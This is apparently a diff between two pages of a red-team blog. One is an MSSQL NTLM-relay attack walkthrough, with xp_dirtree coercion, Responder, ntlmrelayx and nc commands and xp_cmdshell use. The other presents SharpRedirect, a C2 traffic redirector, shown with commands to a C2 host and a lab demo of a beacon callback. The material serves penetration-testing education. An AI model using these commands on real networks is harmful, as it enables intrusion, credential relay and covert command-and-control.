+<p>Throughout the application, robust error handling ensures that unexpected issues do not crash the tool. For example, if a client disconnects unexpectedly or a network error occurs, the tool logs the error and continues operating.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-csharp"><code v-pre class="language-csharp">catch (Exception ex)
+{
+    Console.WriteLine($&quot;Error handling client: {ex.Message}&quot;);
+}</code></pre>
+</doc-codeblock></div>
+<p>This focus on reliability makes SharpRedirect suitable for real-world scenarios where network conditions may be unpredictable.</p>
+<doc-anchor-target id="practical-usage">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#attack-2---relaying">#</doc-anchor-trigger>
-        <span>Attack 2 - Relaying</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#practical-usage">#</doc-anchor-trigger>
+        <span>Practical Usage</span>
     </h3>
 </doc-anchor-target>
-<p>Here is where it is getting more interesting. Imagine for this demo that we have compromised a user who is not sysadmin over any database, and the <code v-pre>xp_cmdshell</code> stored procedure is disabled, as well as the <code v-pre>sp_start_job</code>. Obviously one thing that we can do is to scrape the database for sensitive content, but is there any other attack vector? Yes!</p>
-<p>As previously explained, the <code v-pre>xp_dirtree</code> stored procedure is used to read local or remote files over SMB. This procedure is handy when it comes to easy database migration, but can cause some issues. Since the <code v-pre>xp_dirtree</code> is used for remote SMB operations, by setting up responder with <code v-pre>responder -I &lt;interface&gt;</code> we can grap the NTLMv2 hash of the machine account. To trigger authentication, it is enough to just do <code v-pre>xp_dirtree \\ip\share\something</code> from <code v-pre>impacket-mssqlclient</code> shell. Usually, the database server is running as <code v-pre>NT AUTHORITY \ SERVICE</code> user. This will cause the NTLMv2 hash of the machine account to be captured.</p>
-<p>However, sometimes the database service can be misconfigured to operate from the context of privileged domain account. This setting is located at <code v-pre>SQL SERVER CONFIGURATION MANAGER -&gt; DB Instance -&gt; Log On</code></p>
-<p><figure class="content-center">
-    <img src="config_domain_user.png" alt="Database running as LSEC\sql1">
-    <figcaption class="caption">Database running as <code v-pre>LSEC\sql1</code></figcaption>
-</figure>
-</p>
-<p>Now you may ask, well how to enumerate that if we dont have local access to the sever?</p>
-<p>Coerce! If the database is misconfigured, after successful authentication capture we would get the NTLMv2 of the domain user rather than the machine account.</p>
-<p><figure class="content-center">
-    <img src="ntlmv2.png" alt="Capturing NTLMv2 hash of sql1 user">
-    <figcaption class="caption">Capturing NTLMv2 hash of <code v-pre>sql1</code> user</figcaption>
-</figure>
-</p>
-<p>When that is the case, even though we don&#x27;t know the password of this user (even though we might try to crack it), we can try to relay the incoming authentication against other services / servers. Since now the captured account name nudges that he might have admin rights over some databases, I guess it makes most sense to relay it over all DB instances.</p>
+<p>Using SharpRedirect is straightforward. Suppose you want to redirect traffic from <code v-pre>localhost:8080</code> to a remote C2 server at <code v-pre>c2.example.com:443</code>. You would execute the following command:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">SharpRedirect.exe 8080 c2.example.com 443</code></pre>
+</doc-codeblock></div>
+<p>The tool immediately starts listening on port 8080 and forwards incoming traffic to the specified destination. This setup is particularly useful in situations where network constraints prevent direct communication with the target host.</p>
+<p>Additionally, the SharpRedirect tool can be also executed via any <code v-pre>execute-assembly</code> C2 module. This allows you to redirect traffic and compromise new machines without the need to ever leave the C2 framework.</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
     <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
@@ -579,18 +562,38 @@ If you want to select only the <code v-pre>ComputerName</code> field, you can us
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>If you are relaying against many hosts at once via the <code v-pre>-tf</code> flag in <code v-pre>ntlmrelayx</code>, it is super important to note the protocol for each host, for instance:</p>
-<p>mssql://host1</p>
-<p>mssql://host2</p>
-<p>If that is not the case, <code v-pre>ntlmrelayx</code> will always relay to SMB.</p>
+<p>When setting up redirection for your penetration testing operations, it is <strong>critical</strong> to ensure your payloads are configured to communicate with the <strong>redirector&#x27;s IP address</strong> rather than the original Command and Control (C2) server&#x27;s IP.</p>
         </div>
     </div>
 </div>
-<p>Now let&#x27;s setup the <code v-pre>ntlmrelayx</code>:</p>
-<p><code v-pre>impacket-ntlmrelayx -t mssql://172.16.16.52 -smb2support -ts -debug -i</code></p>
-<p>Here, the <code v-pre>-i</code> flag is super important. This flag will start fully functional <code v-pre>mssqlclient</code> shell against the target, if the authentication succeded. If this flag is missing, <code v-pre>ntlmrelayx</code> will try to execute SQL queries instead.</p>
-<p>To exploit, it is enough to trigger <code v-pre>xp_dirtree</code> again</p>
-<p><code v-pre>xp_dirtree \\172.16.16.130\share\asd</code></p>
+<doc-anchor-target id="demo">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#demo">#</doc-anchor-trigger>
+        <span>Demo</span>
+    </h3>
+</doc-anchor-target>
+<p>To showcase the tool I have prepared the following lab setup:
+<figure class="content-center">
+    <img src="demo.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>In this case I have compromised the SQL01 server which is allowed from the firewall to connect to outbound servers. I dumped credentials and found a valid DA pair. Trying to obtain a C2 callback from the DC fails since it is not allowed from the firewall for outbound communication.</p>
+<p>Let&#x27;s start SharpRedirect on SQL01:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">.\SharpRedirect.exe 443 192.168.0.157 443</code></pre>
+</doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="starting_redirector.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>With the redirector setup now I need to generate new beacon with modified target host. During this demo I used Mythic C2 and my Haunt C2 Powershell Agent.</p>
+<p><figure class="content-center">
+    <img src="new_beacon.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
     <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
@@ -604,26 +607,14 @@ If you want to select only the <code v-pre>ComputerName</code> field, you can us
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>If you are relaying into multiple targets from file, you may need to trigger the authentication several times if the process hangs up.</p>
+<p>Here is the moment to say special thanks to my <a href="https://www.patreon.com/Lsecqt">Patreon Sponsors</a>. If you also have deeper appreciation for my work, feel free to support me and by doing so you will get access to my private packer (ShadowBurn), my private C2 Agent (Haunt) and more projects that I am sure you will find handy! Thank you once again!</p>
         </div>
     </div>
 </div>
+<p>After making all of the preparation and after executing the new PowerShell beacon via <code v-pre>wmiexec</code>, I receive the fully functioning C2 callback.</p>
 <p><figure class="content-center">
-    <img src="relay.png" alt="Relaying the credentials of LSEC\sql1 user against another database">
-    <figcaption class="caption">Relaying the credentials of <code v-pre>LSEC\sql1</code> user against another database</figcaption>
-</figure>
-</p>
-<p>After the relaying is successful, <code v-pre>ntlmrelayx</code> tells us that there is interactive MSSQL shell on <code v-pre>127.0.0.1:11000</code>. Let&#x27;s connect with nc:</p>
-<p><code v-pre>nc 127.0.0.1 11000</code></p>
-<p><figure class="content-center">
-    <img src="mssqlshell.png" alt="Connecting to the interactive MSSQL shell with nc">
-    <figcaption class="caption">Connecting to the interactive MSSQL shell with nc</figcaption>
-</figure>
-</p>
-<p>With this fully functional shell, we can no retry all the attack paths but now from the context of our privileged user.</p>
-<p><figure class="content-center">
-    <img src="whoami.png" alt="Executing xp_cmdshell">
-    <figcaption class="caption">Executing <code v-pre>xp_cmdshell</code></figcaption>
+    <img src="callback.png" alt="">
+    <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <doc-anchor-target id="conclusion">
@@ -632,9 +623,9 @@ If you want to select only the <code v-pre>ComputerName</code> field, you can us
         <span>Conclusion</span>
     </h2>
 </doc-anchor-target>
-<p>MSSQL servers are handy, but they must be taken with care. A slight misconfiguration might allow lateral movement and persistence on multiple servers, or in the worst-case scenario, even domain takeover.</p>
-<p>From the defensive side of things, it is advised to ensure that the database servers are operating under the context of local service user. No <code v-pre>xp_cmdshell</code> is enabled, no user beside the <code v-pre>sa</code> and the DA can reconfigure the stored procedure, and also, remember to shut down <code v-pre>xp_dirtree</code> unless it is explicitly needed.</p>
-<p>Thank you for the reading, if this blog-post was useful, you can support my work by becomming my <a href="https://www.patreon.com/Lsecqt">Patreon</a>.</p>
+<p>By leveraging redirection, you gain the flexibility and stealth necessary to navigate challenging environments. Whether you’re evading detection, bypassing restrictions, or safeguarding your infrastructure, SharpRedirect empowers you to stay one step ahead.</p>
+<p>If you’re interested in learning more about operational security techniques or want to see SharpRedirect in action, feel free to reach out or check out my related videos and tutorials. Happy redirecting!</p>
+<p>If you&#x27;re finding my content helpful and want to stay updated with more tutorials, tips, and insights into penetration testing, hacking infrastructure, and advanced techniques, make sure to <strong>subscribe to my <a href="https://www.youtube.com/c/Lsecqt">YouTube channel</a></strong>! Your support helps me create even more valuable content for the community. Let&#x27;s master these skills together!</p>
 
                                 
                                 <!-- Required only on API pages -->
@@ -644,23 +635,16 @@ If you want to select only the <code v-pre>ComputerName</code> field, you can us
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../malware-development/weaponizing-dll-hijacking-via-dll-proxying/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Red Teaming Army</span>
+                                                <span class="block mt-1">Weaponizing DLL Hijacking via DLL Proxying</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../active-directory/unleashing-the-power-of-unconstrained-delegation/">
-                                            <span>
-                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">Unleashing the Power of Unconstrained Delegation</span>
-                                            </span>
-                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
-                                        </a>
                                     </div>
                                 </nav>
                             </footer>
@@ -701,6 +685,6 @@ If you want to select only the <code v-pre>ComputerName</code> field, you can us
 
     <div id="docs-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Compromising MSSQL Databases by Relaying", level: 2, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Redirecting Traffic From Windows via SharpRedirect", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
